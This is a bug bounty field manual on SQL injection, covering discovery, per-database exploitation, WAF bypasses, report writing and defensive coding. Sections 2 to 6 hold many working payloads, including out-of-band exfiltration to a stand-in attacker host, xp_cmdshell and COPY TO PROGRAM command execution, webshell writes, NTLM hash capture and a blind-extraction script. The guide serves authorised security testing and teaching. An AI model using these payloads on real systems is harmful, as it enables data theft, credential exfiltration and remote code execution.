# SQL Injection: An Elite Bug Bounty Hunter's Field Manual

SQL injection has been on the OWASP Top 10 since it existed, got demoted to A03:2021 "Injection" as a category, and yet I'm still paying mortgage payments off the back of it in 2026. Let me walk you through how I actually approach it on real programs.

---

## 1. What SQLi Is and Why It Still Matters in 2026

**The primitive:** SQL injection occurs when an application concatenates untrusted input into a query sent to a SQL engine, causing the parser to interpret attacker-controlled bytes as SQL syntax rather than data. The trust boundary is the parser — once it's crossed, you're speaking to the database directly.

**Why it still pays in 2026:**

- **ORM blind spots.** Developers trust ORMs, but every ORM (Sequelize, Hibernate, Django, SQLAlchemy, Prisma, GORM, ActiveRecord) has a `raw()`, `query()`, `Raw()`, or `where(string)` escape hatch. Devs reach for it when the ORM is too restrictive.
- **LLM-generated code.** Since the explosion of AI-assisted coding 2023–2025, I've seen a measurable uptick in string-concatenated queries shipped by junior devs pasting model output. Models love `f"SELECT * FROM users WHERE id = {user_id}"`.
- **NoSQL-to-SQL adapters, GraphQL resolvers, and analytic backends.** Lots of "modern" stacks ultimately serialize to a SQL dialect (Trino, Snowflake, ClickHouse, DuckDB, BigQuery). Each has its own quirks and its own injection surface.
- **Second-order and stored injections in JSON columns, log ingestion pipelines, and audit trails.**
- **Internal admin panels, B2B tooling, and legacy microservices** that rarely see pentests.
- **GraphQL + SQL resolvers**, where the injectable input is three hops removed from the query.

SQLi is "solved" the way XSS is "solved" — in principle, never in practice.

---

## 2. Categories of SQL Injection

### In-band (Classic)
Results return in the HTTP response body. Fastest to exploit, dying in prevalence because most modern endpoints return structured JSON rather than string-concatenated error pages.

### UNION-Based
A subclass of in-band. You append `UNION SELECT` to piggyback arbitrary data onto the original result set. Requires column-count parity and compatible types (usually solved by `NULL` padding).

```sql
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,username,password FROM users-- -
```

### Error-Based
Force the DBMS to emit an error that embeds the result of a subquery. Most productive on MSSQL and MySQL <5.7 with verbose error handling.

MySQL classic:
```sql
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -
```

PostgreSQL via type-cast:
```sql
' AND 1=CAST((SELECT current_user) AS int)-- -
```

MSSQL:
```sql
' AND 1=CONVERT(int,(SELECT @@version))-- -
```

### Blind Boolean-Based
No data returned; response differs based on truth value of your injected predicate. Extract one bit at a time.

```sql
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -
```

### Blind Time-Based
When no content differential exists, introduce a measurable delay.

- MySQL: `SLEEP(5)`, `BENCHMARK(10000000,MD5('a'))`
- PostgreSQL: `pg_sleep(5)`, `pg_sleep_for('5 seconds')`
- MSSQL: `WAITFOR DELAY '0:0:5'`
- Oracle: `DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)`
- SQLite: `RANDOMBLOB(100000000)` heavy work; no native sleep

Canonical payload pattern:
```sql
'; IF(SUBSTRING((SELECT top 1 name FROM master..sysdatabases),1,1)='a') WAITFOR DELAY '0:0:5'-- -
```

### Out-of-Band (OOB)
Exfiltrate via DNS/HTTP when you have no response channel. Gold on blind injections against systems with egress.

MSSQL:
```sql
'; DECLARE @q VARCHAR(1024);SET @q=(SELECT TOP 1 password FROM users)+'.attacker.tld';EXEC('master..xp_dirtree "\\'+@q+'\c$"')-- -
```

PostgreSQL (if `dblink` / `COPY ... PROGRAM` enabled):
```sql
COPY (SELECT '') TO PROGRAM 'nslookup `whoami`.attacker.tld';
```

Oracle classic:
```sql
' || (SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.attacker.tld') FROM dual)-- -
' || DBMS_LDAP.INIT((SELECT password FROM users WHERE rownum=1)||'.attacker.tld',80)-- -
```

MySQL (Windows with UNC):
```sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.tld\\a'));
```

### Second-Order
Your payload is stored during one request and executed during another. Input validation looks clean on the sink of write, but a later read path concatenates it into a query. Classic example: registration stores a username with `'`, and the "change password" path uses that username unsafely.

### Stacked Queries
Appending `;` and a second statement. Support is driver-dependent: MSSQL/PostgreSQL via many drivers yes; MySQL via most PHP/Python connectors no (single-statement); Oracle no natively. Always probe driver behavior before committing to a stacked-query exploit path.

---

## 3. Discovering SQLi in the Wild

### Reconnaissance

- Full subdomain enumeration (`amass`, `subfinder`, `assetfinder`, certificate transparency, GitHub dorks, `chaos-client`). Old subdomains run old code.
- Map the tech stack with `wappalyzer`, response headers, cookie names (`PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `connect.sid`).
- Harvest endpoints: `waybackurls`, `gau`, `katana`, `hakrawler`, `ParamSpider`, Burp spider, JavaScript crawling via `LinkFinder` / `subjs`.
- Pull mobile API endpoints from decompiled APKs (`jadx`, `apktool`). Mobile backends are notoriously under-tested.
- Grab Swagger/OpenAPI specs from common paths: `/swagger`, `/api-docs`, `/openapi.json`, `/v2/api-docs`, `/graphql` introspection.

### Parameter Discovery

- `arjun`, `ParamSpider`, `x8`, `Param Miner` Burp extension (guess both query and header parameters).
- Header parameters are under-tested: `X-Forwarded-For`, `X-Real-IP`, `User-Agent`, `Referer`, `X-Api-Version`, custom tenant headers. Many apps log these straight into SQL.
- Cookie values — session IDs are usually opaque but secondary cookies (tracking, AB testing, tenant) often hit SQL.
- Order-by / sort / filter parameters: `sort=`, `orderBy=`, `direction=`. These often can't be parameterized and get concatenated.
- JSON bodies: deeply nested fields, filter DSLs, GraphQL variables.

### Fuzzing Approach

**Stage 1 — Canary detection:** send a benign character that frequently changes query parse state and watch for differences.

```
'  "  \  `  )  ')  '))  '--  ';  ,  .
```

Log status code, content length, response time, and response hash. Any anomaly is a lead.

**Stage 2 — Syntactic confirmation:** verify with semantically equivalent pairs. This is the golden rule.

```
id=1'                  -> error / diff
id=1' AND '1'='1       -> equivalent to id=1
id=1' AND '1'='2       -> empty result
id=1 AND 1=1-- -       -> equivalent
id=1 AND 1=2-- -       -> empty
id=1/**/AND/**/1=1-- - -> same behavior if comments absorbed
```

Arithmetic probe (underrated):
```
id=2-1   -> equivalent to id=1  (strong signal for numeric SQLi)
id=2-1   -> 404 / not equivalent (no injection or string context)
```

**Stage 3 — Time probe:** even on rate-limited targets, a conditional 10-second delay with multiple trials is conclusive.

```
id=1'-SLEEP(5)-'        MySQL string context
id=1-SLEEP(5)           MySQL numeric context
id=1||pg_sleep(5)--     PostgreSQL
id=1;WAITFOR DELAY '0:0:5'-- MSSQL
```

### Detection Signals to Watch

- Content-length deltas across equivalent payloads
- Response time variance correlating with sleep payloads (use multiple trials; network jitter is your enemy)
- Stack traces containing `PDOException`, `SqlException`, `psycopg2`, `ORA-`, `mysqli_`, `sequelize`, `Microsoft OLE DB`, `JDBC`
- Verbose 500s that leak the SQL query
- Differential behavior on `' OR SLEEP(0)='` vs `' OR SLEEP(5)='`
- Subtle UI changes: "0 results" vs "1 result" is a boolean oracle

---

## 4. DB-Specific Exploitation

### Fingerprinting First

```sql
-- Version strings
MySQL:      SELECT @@version;  SELECT version();
PostgreSQL: SELECT version();
MSSQL:      SELECT @@version;
Oracle:     SELECT banner FROM v$version;
SQLite:     SELECT sqlite_version();

-- Dialect-specific truthy probes
MySQL:      ' AND CONNECTION_ID()=CONNECTION_ID()-- -
PostgreSQL: ' AND 1=CAST(version() AS int)-- -  (errors)
MSSQL:      ' AND @@SPID=@@SPID-- -
Oracle:     ' AND ROWNUM=ROWNUM-- -
SQLite:     ' AND sqlite_version()=sqlite_version()-- -
```

Comment styles also disambiguate:
- MySQL: `#`, `-- ` (space required), `/* */`, `-- -`
- PostgreSQL/MSSQL/Oracle: `--`, `/* */`
- MySQL version-gated: `/*!50000 SELECT */`

### MySQL

Schema recon:
```sql
' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users-- -
```

File I/O (requires `FILE` privilege):
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
' UNION SELECT '<?php system($_GET[0]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -
```

Notes: `secure_file_priv` must be empty or include target directory; MySQL ≥ 5.7.6 restricts this by default. Check with:
```sql
SELECT @@secure_file_priv;
```

### PostgreSQL

Schema recon:
```sql
' UNION SELECT datname,NULL FROM pg_database-- -
' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'-- -
' UNION SELECT string_agg(username||':'||password,E'\n'),NULL FROM users-- -
```

Command execution paths:
```sql
-- PostgreSQL < 9.3: heavy lifting via pg_proc
-- PostgreSQL >= 9.3 as superuser:
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwn';

-- Via CREATE EXTENSION (superuser):
CREATE EXTENSION plpython3u;
CREATE FUNCTION sh(cmd text) RETURNS text AS $$ import os; return os.popen(cmd).read() $$ LANGUAGE plpython3u;
SELECT sh('id');

-- dblink reflection (cred theft):
SELECT dblink_connect('host=attacker.tld user=... password='||(SELECT passwd FROM pg_shadow LIMIT 1));

-- Large object file read (pre-11 defaults):
SELECT lo_import('/etc/passwd');
```

CVE-2019-9193 (`COPY FROM PROGRAM` / `COPY TO PROGRAM`) made this a go-to RCE for years on superuser contexts; modern PG locks it to superusers, but SaaS misconfigs still expose it.

### MSSQL

Schema recon:
```sql
'; SELECT name FROM master..sysdatabases-- -
'; SELECT name FROM sys.tables-- -
'; SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')-- -
```

RCE chain:
```sql
-- Enable xp_cmdshell if disabled
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami'-- -

-- OLE Automation (alternative if xp_cmdshell blocked)
'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;-- -

-- Linked server abuse
'; SELECT * FROM OPENROWSET('SQLNCLI','Server=attacker.tld;Uid=x;Pwd=y','SELECT 1')-- -

-- NTLM hash capture via UNC
'; EXEC master..xp_dirtree '\\attacker.tld\share'-- -
```

The `xp_dirtree` / `xp_fileexist` / `xp_subdirs` trick is underrated — it forces the SQL service account to authenticate to your SMB listener, letting you capture NetNTLMv2 hashes with Responder. In internal engagements this is often instant domain user compromise.

### Oracle

Schema recon:
```sql
' UNION SELECT table_name,NULL FROM all_tables-- -
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
' UNION SELECT username||':'||password,NULL FROM sys.user$-- -
```

OOB/RCE primitives (privilege-dependent):
```sql
-- Network callbacks (great blind exfil)
SELECT UTL_HTTP.REQUEST('http://attacker.tld/'||(SELECT user FROM dual)) FROM dual;
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM dba_users WHERE rownum=1)||'.attacker.tld') FROM dual;
SELECT DBMS_LDAP.INIT((SELECT banner FROM v$version WHERE rownum=1)||'.attacker.tld',80) FROM dual;

-- Java stored procedure (requires JAVAVM and privileges) — path to OS command
```

Oracle tends to be heavily patched on internet-facing apps; most real-world Oracle SQLi shows up on internal apps.

### SQLite

Less impactful but still useful; often seen in mobile backends and Electron apps.

```sql
' UNION SELECT sql,NULL FROM sqlite_master-- -
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -
' ATTACH DATABASE '/var/www/html/s.php' AS pwn; CREATE TABLE pwn.pwn (c TEXT); INSERT INTO pwn.pwn VALUES ('<?php system($_GET[0]);?>');-- -
```

The `ATTACH DATABASE` write-to-web-root trick is the poor man's `INTO OUTFILE`. Works when SQLite runs as the web user with write access.

---

## 5. WAF and Filter Bypasses

### Keyword Obfuscation
```sql
SELECT -> SeLeCt, SE/**/LECT, %53ELECT, SEL/*!12345*/ECT (MySQL version-gated)
UNION SELECT -> UNION ALL SELECT, UNION(SELECT...), UNION DISTINCT SELECT
AND -> &&, %26%26
OR -> ||, %7c%7c
```

### Whitespace Alternatives
```
space  -> /**/, %09, %0a, %0b, %0c, %0d, %a0, +, ()
```

MySQL accepts function calls without whitespace: `SELECT(user())FROM(dual)` is fully valid.

### Quote Avoidance
When `'` and `"` are filtered:
```sql
-- Hex literals
SELECT * FROM users WHERE name=0x61646d696e
-- CHAR()/CHR()
SELECT CHAR(97,100,109,105,110)
-- Concatenation from built-ins
SELECT database()  -- no quotes needed
```

### Comment Injection Mid-Keyword
MySQL:
```sql
UN/**/ION SEL/**/ECT
/*!50000UNION*/ /*!50000SELECT*/
```

### Logic-Level Bypass
```sql
-- Instead of OR 1=1
' OR 2>1-- -
' OR 'a'>'`'-- -
' OR TRUE-- -
' OR 0x31=0x31-- -

-- Instead of = (if '=' filtered)
' OR 1 LIKE 1-- -
' OR 1 BETWEEN 0 AND 2-- -
' OR 1 IN (1,2,3)-- -
```

### Double-URL-Encoding
Some WAFs decode once, the backend decodes twice:
```
%2527 -> %27 -> '
```

### Unicode/Overlong
Backends using lax unicode normalization may treat fullwidth variants as ASCII:
```
'  <->  U+FF07  (％27 fullwidth)
```

### HTTP Parameter Pollution
Some stacks concatenate duplicate parameters server-side:
```
id=1&id=UNION&id=SELECT...
```
ASP.NET concatenates with `,`; useful for splitting payload across parameters that are individually filtered.

### Parameter Relocation
Move payload from query string to POST body, header, JSON field, multipart field. WAF rulesets often have inconsistent coverage across content types. JSON-wrapped payloads with escaped quotes (`\u0027`) bypass many regex-based WAFs.

### MySQL "Null-byte" and Scientific Notation
```sql
1.e(0)    -- parses as 1
1337e0    -- same
```

Useful when numeric context filters digits but allows `e`.

---

## 6. Impact Escalation: From SELECT to RCE

The severity ladder a triage team will actually respect:

1. **Reflected data leak (informational)** — echoing `SELECT @@version`.
2. **Sensitive data extraction (High)** — usernames, emails, hashed passwords.
3. **PII / payment data (Critical)** — depends on scope.
4. **Auth bypass (Critical)** — `' OR 1=1-- -` in login, or extracting session tokens.
5. **Credential reuse / lateral movement (Critical)** — reusing DB-stored credentials against other services.
6. **File read (Critical)** — `LOAD_FILE('/etc/passwd')`, `pg_read_file`, `BULK INSERT`.
7. **File write (Critical)** — `INTO OUTFILE` webshell, `ATTACH DATABASE`.
8. **RCE (Critical)** — `xp_cmdshell`, `COPY ... TO PROGRAM`, `plpython3u`, UDF injection.
9. **Lateral movement inside the DB cluster** — linked servers, `dblink`, replication creds.
10. **Cloud metadata pivot** — if the DB host can reach `169.254.169.254`, `pg_read_file` or `xp_cmdshell` can steal IAM credentials → full cloud takeover.

### The Cloud Pivot

This is the single biggest multiplier I've leveraged on bounties in the last three years. Once you have any file read or command execution primitive inside AWS/GCP/Azure, hit the metadata service:

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

A "low-sev blind SQLi in an internal admin endpoint" rewrites itself as "full AWS account compromise via exfiltrated IAM keys." Program owners pay for the latter.

### Credential Cracking

Extracted hashes → hashcat → credential stuffing against SSO, Okta, Jenkins, Git. Tons of SQLi reports end at "I got the hash," but triage won't score it Critical without demonstrated impact. Crack a password and pivot — within scope.

---

## 7. Tooling Workflow

### The Layered Stack

**Discovery layer:** Burp Suite Pro (Intruder + Logger++ + Param Miner + Turbo Intruder + Backslash Powered Scanner + SHELLING), or `ffuf` + custom wordlists for offline fuzzing.

**Manual confirmation:** Always done by hand. Sleep probes, boolean oracles, equivalent-pair testing. Never trust an automated scanner's "possible SQLi" flag without manual verification.

**Automated extraction:** sqlmap — but only after you've confirmed injection manually and know the context. Running sqlmap blindly against every parameter is how you get rate-limited or IP-banned.

Typical sqlmap invocation I actually use:
```bash
sqlmap -r req.txt \
  -p vulnerable_param \
  --dbms=mysql \
  --technique=BT \
  --level=3 --risk=2 \
  --tamper=between,space2comment,charencode \
  --random-agent \
  --delay=1 \
  --batch \
  --threads=1
```

Notes:
- Save the request to `req.txt` from Burp so all headers (cookies, CSRF tokens, tenant IDs) replay correctly.
- `--tamper` chaining bypasses WAFs but can also break the query — pick the smallest effective set.
- `--technique` narrowing dramatically speeds up testing.
- Keep `--threads=1` on production bounty targets; you're a guest.

**Custom scripts:** When the target has CSRF token rotation, request signing, HMAC, or encryption around the parameter, sqlmap won't cope. Write a Python script using `requests` with the bit-extraction loop:

```python
import requests, time

def test(payload):
    r = requests.get(url, params={"id": f"1' AND {payload}-- -"})
    return r.elapsed.total_seconds() > 4

# Binary search each byte
for pos in range(1, 33):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if test(f"ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    print(chr(lo), end="", flush=True)
```

### Tool Decision Tree

- Confirmed injection, simple stack, no WAF → sqlmap full auto.
- Confirmed injection, WAF present → sqlmap with tamper + manual PoC.
- Auth/signing/encrypted params → custom script.
- Stacked, error-based, or OOB-friendly target → manual first for clean PoC, then sqlmap with explicit technique.
- GraphQL / JSON body injection → Burp Intruder with JSON-aware payload set, then custom script.

---

## 8. Writing a High-Quality SQLi Bug Bounty Report

### Structure

**Title:** `[Critical] Time-based blind SQL injection in /api/v2/search?sort — MySQL, extractable via sqlmap`

Programs triage by title first. Include severity, technique, endpoint, impact hook.

**Summary (2–3 sentences):** what, where, impact, stack.

**Severity:** CVSS 3.1 vector with justification.

Example for unauthenticated blind SQLi returning sensitive data:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  => 9.8 Critical
```

If authentication is required and the role is widely held:
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  => 8.8 High
```

Do not inflate. Triage teams will downgrade inflated reports and your signal score with it.

**CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command.

**Vulnerable endpoint:**
```
POST /api/v2/search HTTP/1.1
Host: target.example.com
Content-Type: application/json
Cookie: session=...

{"sort":"created_at","direction":"ASC"}
```
Injectable parameter: `sort`.

**Reproduction steps:**
1. Authenticate as any registered user.
2. Submit the request above with `"sort":"created_at"`; response returns HTTP 200 in ~180 ms.
3. Submit with `"sort":"(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)"`; response returns HTTP 200 in ~5180 ms.
4. Submit with `"sort":"(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"`; response returns in ~180 ms.

Timing differential of 5 seconds, reproducible across 10 trials (attach CSV), confirms time-based blind SQL injection.

**Proof of impact:**
```
"sort":"(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT user()),1,1))=114) THEN SLEEP(5) ELSE 0 END)"
```
Extracts `user()` byte by byte. Full extraction via sqlmap:
```bash
sqlmap -r req.txt -p sort --dbms=mysql --technique=T --dump -T users -D app_prod
```

Include a redacted screenshot of extracted rows with PII blurred. Show count, not content, when possible — "Extracted 1,247,892 email/hashed-password rows" is more impactful than a screenshot of real PII.

**Full impact description:**
- Unauthenticated/authenticated full read access to database.
- Direct extraction of user credentials (bcrypt, crackable offline at scale).
- Potential for pivot to file write via `INTO OUTFILE` if `secure_file_priv` permits (not tested per scope).
- Regulatory exposure (GDPR Art. 32/33, CCPA) given PII in scope.

**Remediation:**
- Replace string-concatenated sort parameter with an allowlist: `{"created_at","updated_at","name"}`.
- Where dynamic SQL is unavoidable, parameterize with prepared statements.
- Confirm ORM usage is not bypassed via `raw()`.
- Verify DB user has `SELECT`-only privilege on the schema required — not superuser, not `FILE`.
- Enable query logging and alert on `information_schema` access from the app role.

**References:** OWASP SQLi Cheat Sheet, CWE-89, and any relevant public writeups.

### What Actually Moves Reports

- Reproducible, minimal PoC. A single `curl` command that shows the bug.
- Video capture for blind injection — timing is hard to convey in text.
- Impact statement grounded in *the program's* assets. Generic "attacker can read database" gets downgraded. "Attacker can extract the `user_tokens` table and impersonate any user in this production tenant" gets paid.
- Separate report per logical bug. Don't bundle five SQLi across five endpoints into one report — programs often pay per report.

---

## 9. Common Mistakes That Tank SQLi Reports

- **Reporting a `'` triggering a 500 error.** Not a vulnerability on its own — show semantic exploitation.
- **WAF-only trigger** without a working bypass. If Cloudflare blocks your payload, you've reported the WAF's existence, not the bug.
- **Unfingerprintable DB.** Triage wants to know the DBMS. "I don't know what database it is" reads as incomplete research.
- **Claiming RCE without demonstration.** If you say `xp_cmdshell` works, prove it by executing `whoami`. Never actually touch the host filesystem or run destructive commands.
- **Out of scope.** Many programs explicitly exclude third-party integrations, staging subdomains, or read-only analytics endpoints. Read the policy.
- **DoS via heavy queries.** `SELECT * FROM users WHERE id=(SELECT sleep(30))` with 100 parallel requests is abuse, not research. Most programs consider DoS out of scope.
- **Destructive testing.** Never `DROP`, `DELETE`, `UPDATE`, `INSERT`, or `TRUNCATE` on a target you don't own. Demonstrate reads only. Even a `CREATE TABLE pwn_poc(...)` can get you banned from a program.
- **Duplicate of an internal finding.** You can't prevent this, but checking the program's "known issues" / Hall of Fame / prior disclosures sometimes tells you what's been reported.
- **Blind injection without an oracle.** "I got a 500 error" is not an oracle. You need a reliable truth-value differential.
- **Time-based without statistical rigor.** One-off delays can be network jitter. Report median over ≥10 trials.
- **Over-reliance on sqlmap output.** Pasting `sqlmap --dump` output without understanding what technique it used or why the injection works signals low quality.
- **Skipping impact.** A confirmed injection that extracts `@@version` only is an informational-grade finding on many programs. Escalate before reporting.

---

## 10. Defensive Recommendations

### Primary Control: Parameterized Queries

The only reliable defense. Every major language has it:

```python
# Python / psycopg2
cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```
```go
db.QueryRow("SELECT * FROM users WHERE id = $1", userID)
```

Identifiers (table names, column names, sort directions) cannot be parameterized. For those, use a strict allowlist server-side — never a denylist.

### Stored Procedures
Helpful only if they themselves don't concatenate. `EXEC('SELECT * FROM users WHERE id=' + @id)` inside a proc is just as vulnerable.

### ORM Usage Guidelines
- Ban or code-review every `raw()`, `exec()`, `Raw()`, or string-builder query.
- Linters: `bandit` for Python, `semgrep` rules for most languages.
- CI-gated SAST with SQLi-specific rules.

### Least Privilege
- App DB user should have only `SELECT/INSERT/UPDATE/DELETE` on the specific schema/tables it needs.
- Revoke `FILE`, `SUPERUSER`, `xp_cmdshell`, `CREATE FUNCTION`, `COPY ... FROM PROGRAM`.
- Separate DB users for read vs write paths.
- Separate DB users for tenants where feasible; defense-in-depth against tenant-crossing extraction.

### Hardening Specific Engines
- MySQL: `secure_file_priv=NULL`, `local_infile=0`, disable `LOAD DATA LOCAL INFILE`.
- MSSQL: disable `xp_cmdshell`, `Ole Automation Procedures`, `sp_OACreate`. Remove extended procs you don't use.
- PostgreSQL: run as non-superuser; disable untrusted procedural languages; restrict `COPY`.
- Oracle: revoke `CREATE PROCEDURE`, `JAVA` execution privileges, network ACLs on `UTL_HTTP` / `UTL_INADDR` / `DBMS_LDAP`.

### Defense in Depth
- **WAF:** Cloudflare, AWS WAF, Imperva, F5 — useful as a speed bump, not a control. Assume it's bypassable.
- **RASP:** runtime monitoring catches some patterns the WAF misses.
- **Query allowlisting / query signatures:** pgBadger-style query fingerprint alerting.
- **Egress filtering from DB hosts:** prevents OOB exfiltration and cloud-metadata pivots.
- **Network segmentation:** DB host cannot reach arbitrary internet endpoints or `169.254.169.254`.
- **Monitoring:** alert on `information_schema` / `pg_catalog` / `sysobjects` access from application roles.
- **Secrets hygiene:** DB host should not hold credentials for other services.

### Code Review Checklist for SQLi
- Every string concatenation or f-string that reaches a DB driver.
- Every ORM escape hatch.
- Every dynamic `ORDER BY`, `LIMIT`, `OFFSET`, table name, or column name.
- Every second-order path: data stored, then used in a later query.
- Every JSON filter DSL or search query builder.
- Every admin/internal endpoint (often the forgotten surface).

---

## Final Intuition

The reason SQLi continues to pay in 2026 isn't because the primitive is hard to defend against — parameterized queries are one `?` away. It's because the surface area of "places where strings become SQL" is enormous, growing (GraphQL, LLM-generated backends, analytics DSLs, admin tools), and under-tested at the edges. As a hunter, your edge is:

1. Hit endpoints nobody tests — internal, B2B, mobile, legacy.
2. Fuzz parameters nobody fuzzes — headers, cookies, JSON-deep fields, GraphQL variables.
3. Chain injection with cloud-metadata or credential-reuse pivots to turn mediums into criticals.
4. Communicate impact in the language of the program owner, not the language of SQL.

Good hunting.
